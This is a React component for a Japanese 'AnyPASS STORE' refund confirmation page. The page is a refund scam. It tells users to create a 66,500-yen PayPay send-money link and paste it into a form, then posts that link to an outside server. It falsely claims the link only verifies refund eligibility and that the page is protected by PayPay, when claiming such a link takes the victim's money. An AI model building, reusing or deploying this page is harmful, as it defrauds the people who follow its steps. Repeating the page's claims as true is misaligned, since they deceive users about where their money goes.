
import React, { useState } from "react";
import {
  ArrowLeft,
  Clock,
  CheckCircle2,
  Circle,
  FileText,
  AlertCircle,
  CreditCard,
  Calendar,
  Hash,
  Loader2,
} from "lucide-react";

const PINK = "#E84060";
const BLUE = "#4A8AF4";
const PINK_BG = "#FCE8ED";
const RED = "#DC2626";

const API_URL = "https://anypass.onrender.com";

// Change this later to get the real order ID from your route/order data
const ORDER_ID = "ORD-58291";

const TERMS = [
  "返金は元のお支払い方法に返金され、別のカードやアカウントへ変更することはできません。",
  "AnyPASS STOREでは、99,000円以上の返金申請のみ受け付けています。",
  "有効な返金申請を行うには、以下の手順に従ってPayPay送金リンクを作成し、送信してください。",
  "送信されたPayPay送金リンクは返金確認の一環として審査され、申請が適用条件を満たしているか確認されます。",
  "返金総額は99,000円で、32,500円と66,500円の合計です。返金は確認および対象条件を満たした場合に実行されます。",
];

const LINK_STEPS = [
  "PayPayアプリを開き、「送る」タブに移動してください。",
  "金額に「66,500円」と入力し、連絡先を選択する代わりに「リンクを作成」を選択してください。",
  "作成したリンクをコピーしてください。",
  "以下の入力欄にリンクを貼り付けてください。返金申請を確認します。",
];

export default function RefundConfirmation() {
  const [agreed, setAgreed] = useState(false);
  const [paypalLink, setPaypalLink] = useState("");
  const [showAgreeError, setShowAgreeError] = useState(false);
  const [showLinkError, setShowLinkError] = useState(false);

  // pending | processing | confirmed
  const [status, setStatus] = useState("pending");

  const isConfirmed = status === "confirmed";
  const isProcessing = status === "processing";
  const linkFilled = paypalLink.trim().length > 0;

  const handleConfirm = async () => {
    const linkMissing = !linkFilled;
    const agreeMissing = !agreed;

    setShowLinkError(linkMissing);
    setShowAgreeError(agreeMissing);

    if (linkMissing || agreeMissing) {
      return;
    }

    try {
      setStatus("processing");

      const response = await fetch(
        `${API_URL}/api/refunds/payment-link`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            paymentLink: paypalLink.trim(),
          }),
        }
      );

      const data = await response.json();

      if (!response.ok) {
        throw new Error(
          data.message || "PayPay送金リンクの送信に失敗しました。"
        );
      }

      console.log("Payment link submitted:", data);

      setStatus("confirmed");
    } catch (error) {
      console.error("Payment link submission error:", error);

      setStatus("pending");

      alert(
        error.message ||
          "PayPay送金リンクの送信中に問題が発生しました。"
      );
    }
  };

  const steps = [
    {
      label: "申請済み",
      done: true,
    },
    {
      label: "承認",
      done: isConfirmed,
      current: !isConfirmed,
    },
    {
      label: "返金完了",
      done: isConfirmed,
    },
  ];

  return (
    <div className="min-h-screen bg-slate-50 flex flex-col items-center p-6">
      <div className="w-full max-w-md">

        {/* トップバー */}
        <div className="flex items-center justify-between mb-4">
          <button
            type="button"
            className="flex items-center gap-1.5 text-sm text-slate-500 hover:text-slate-800 transition-colors"
          >
            <ArrowLeft className="w-4 h-4" />
            注文に戻る
          </button>

          <span className="flex items-center gap-1 text-xs text-slate-400">
            <Hash className="w-3.5 h-3.5" />
            {ORDER_ID}
          </span>
        </div>

        {/* カード1：ステータス */}
        <div className="bg-white rounded-2xl border border-slate-200 shadow-sm overflow-hidden">

          <div className="p-6 flex items-start gap-4 border-b border-slate-100">
            <div
              className="w-11 h-11 rounded-full flex items-center justify-center shrink-0"
              style={{
                backgroundColor: isConfirmed ? "#E7EFFD" : PINK_BG,
              }}
            >
              {isConfirmed ? (
                <CheckCircle2
                  className="w-5 h-5"
                  style={{ color: BLUE }}
                />
              ) : (
                <Clock
                  className="w-5 h-5"
                  style={{ color: PINK }}
                />
              )}
            </div>

            <div className="flex-1 min-w-0">
              <p
                className="text-sm font-medium"
                style={{
                  color: isConfirmed ? BLUE : PINK,
                }}
              >
                {isConfirmed
                  ? "返金確認済み"
                  : "承認待ち"}
              </p>

              <p className="text-2xl font-semibold text-slate-900 tracking-tight mt-0.5">
                32500 JPY
              </p>
            </div>
          </div>

          {/* ステップ */}
          <div className="px-6 py-5 border-b border-slate-100">
            <div className="flex items-center">
              {steps.map((step, i) => (
                <React.Fragment key={step.label}>
                  <div className="flex flex-col items-center gap-1.5 w-16">

                    {step.done ? (
                      <CheckCircle2
                        className="w-5 h-5"
                        style={{
                          color: isConfirmed ? BLUE : PINK,
                        }}
                      />
                    ) : step.current ? (
                      <div
                        className="w-5 h-5 rounded-full border-2 flex items-center justify-center"
                        style={{
                          borderColor: PINK,
                        }}
                      >
                        <div
                          className="w-2 h-2 rounded-full"
                          style={{
                            backgroundColor: PINK,
                          }}
                        />
                      </div>
                    ) : (
                      <Circle className="w-5 h-5 text-slate-300" />
                    )}

                    <span className="text-[11px] text-slate-500 text-center leading-tight">
                      {step.label}
                    </span>
                  </div>

                  {i < steps.length - 1 && (
                    <div
                      className="h-px flex-1 -mt-5"
                      style={{
                        backgroundColor: step.done
                          ? PINK
                          : "#E2E8F0",
                      }}
                    />
                  )}
                </React.Fragment>
              ))}
            </div>
          </div>

          {/* 詳細 */}
          <div className="px-6 py-5 border-b border-slate-100 space-y-3">

            <div className="flex items-center justify-between text-sm">
              <span className="flex items-center gap-2 text-slate-500">
                <Calendar className="w-4 h-4" />
                申請日
              </span>

              <span className="text-slate-800 font-medium">
                2026年9月18日
              </span>
            </div>

            <div className="flex items-center justify-between text-sm">
              <span className="flex items-center gap-2 text-slate-500">
                <CreditCard className="w-4 h-4" />
                返金方法
              </span>

              <span className="text-slate-800 font-medium">
                PayPay
              </span>
            </div>

          </div>

          {/* 利用規約 */}
          <div className="px-6 py-5">

            <div className="flex items-center gap-2 text-sm font-medium text-slate-800">
              <FileText className="w-4 h-4 text-slate-400" />
              返金規約
            </div>

            <ul className="mt-3 space-y-2 text-xs text-slate-500 leading-relaxed">
              {TERMS.map((term, i) => (
                <li
                  key={i}
                  className="flex gap-2"
                >
                  <span className="text-slate-300">
                    •
                  </span>

                  <span>
                    {term}
                  </span>
                </li>
              ))}
            </ul>

            {!isConfirmed && (
              <label className="mt-4 flex items-start gap-2.5 cursor-pointer select-none">

                <input
                  type="checkbox"
                  checked={agreed}
                  onChange={(e) => {
                    setAgreed(e.target.checked);

                    if (e.target.checked) {
                      setShowAgreeError(false);
                    }
                  }}
                  className="mt-0.5 w-4 h-4 rounded border-slate-300 accent-current"
                  style={{
                    color: PINK,
                  }}
                />

                <span className="text-sm text-slate-600">
                  返金規約を読み、内容に同意します。
                </span>
              </label>
            )}

            {showAgreeError && !agreed && (
              <p
                className="mt-2 flex items-center gap-1.5 text-xs"
                style={{
                  color: RED,
                }}
              >
                <AlertCircle className="w-3.5 h-3.5" />

                規約に同意してから返金手続きを完了してください。
              </p>
            )}

          </div>
        </div>

        {/* カード2：PayPay送金リンク */}
        <div className="bg-white rounded-2xl border border-slate-200 shadow-sm overflow-hidden mt-5">

          <div className="p-6 border-b border-slate-100">

            <div className="flex items-center gap-2 text-sm font-medium text-slate-800">
              <img
                src="/paypaylogo.png"
                alt="PayPay"
                className="w-6 h-6"
              />

              PayPay送金リンクの作成方法
            </div>

            <p className="text-sm text-slate-500 mt-1">
              PayPayの残高が十分にあることを確認してください。
            </p>

            <ol className="mt-4 space-y-3">
              {LINK_STEPS.map((step, i) => (
                <li
                  key={i}
                  className="flex gap-3 text-sm text-slate-600"
                >
                  <span
                    className="w-5 h-5 rounded-full flex items-center justify-center text-[11px] font-medium shrink-0"
                    style={{
                      backgroundColor: "#E7EFFD",
                      color: BLUE,
                    }}
                  >
                    {i + 1}
                  </span>

                  <span className="leading-relaxed">
                    {step}
                  </span>
                </li>
              ))}
            </ol>

          </div>

          {/* 送金リンク入力欄 */}
          <div className="p-6">

            <label className="text-sm font-medium text-slate-800">
              PayPay送金リンク
            </label>

            <input
              type="url"
              disabled={isConfirmed || isProcessing}
              value={paypalLink}
              onChange={(e) => {
                setPaypalLink(e.target.value);

                if (e.target.value.trim().length > 0) {
                  setShowLinkError(false);
                }
              }}
              placeholder="https://pay.paypay.ne.jp/......"
              className="mt-2 w-full rounded-sm border border-slate-400 px-3 py-3 text-sm text-slate-800 placeholder:text-slate-400 focus:outline-none focus:ring-2 disabled:bg-slate-50 disabled:text-slate-400"
              style={{
                "--tw-ring-color": BLUE,
              }}
            />

            {showLinkError && !linkFilled && (
              <p
                className="mt-2 flex items-center gap-1.5 text-xs"
                style={{
                  color: RED,
                }}
              >
                <AlertCircle className="w-3.5 h-3.5" />

                続行するにはPayPay送金リンクを入力してください。
              </p>
            )}

            {linkFilled && (
              <p
                className="mt-2 flex items-center gap-1.5 text-xs"
                style={{
                  color: BLUE,
                }}
              >
                <CheckCircle2 className="w-3.5 h-3.5" />

                {isConfirmed
                  ? "送金リンクが正常に送信されました。"
                  : isProcessing
                  ? "送金リンクを送信中..."
                  : "リンクが追加されました。"}
              </p>
            )}

          </div>

          <p className="px-6 pb-6 text-xs text-slate-400">
            注意：PayPay送金リンクは、返金申請が99,000円の基準額を満たしているか確認するためにのみ使用されます。その他の目的には使用されません。
          </p>

          <div className="px-6 pb-6 text-xs text-slate-400 text-center">
            <img
              src="/paypaylogo.png"
              alt="PayPay"
              className="w-6 h-6 inline-block mr-2"
            />

            <span>
              PayPayによって提供・保護されています。
            </span>
          </div>

        </div>

        <p className="text-center text-xs text-slate-400 mt-5">
          この返金についてご質問がありますか？いつでもサポートにお問い合わせください。
        </p>

      </div>

      {/* 確認ボタン */}
      <div className="w-full max-w-md mt-6">

        {isConfirmed ? (
          <div
            className="w-full rounded-xl py-3 flex items-center justify-center gap-2 text-sm font-medium"
            style={{
              backgroundColor: "#E7EFFD",
              color: BLUE,
            }}
          >
            <CheckCircle2 className="w-4 h-4" />

            返金処理が完了するまでお待ちください。
          </div>
        ) : (
          <button
            onClick={handleConfirm}
            disabled={isProcessing}
            className="w-full rounded-xl py-3 flex items-center justify-center gap-2 text-sm font-medium text-white transition-opacity disabled:opacity-70"
            style={{
              backgroundColor: PINK,
            }}
          >
            {isProcessing ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin" />
                送信中…
              </>
            ) : (
              "確認して返金を完了する"
            )}
          </button>
        )}

      </div>
    </div>
  );
}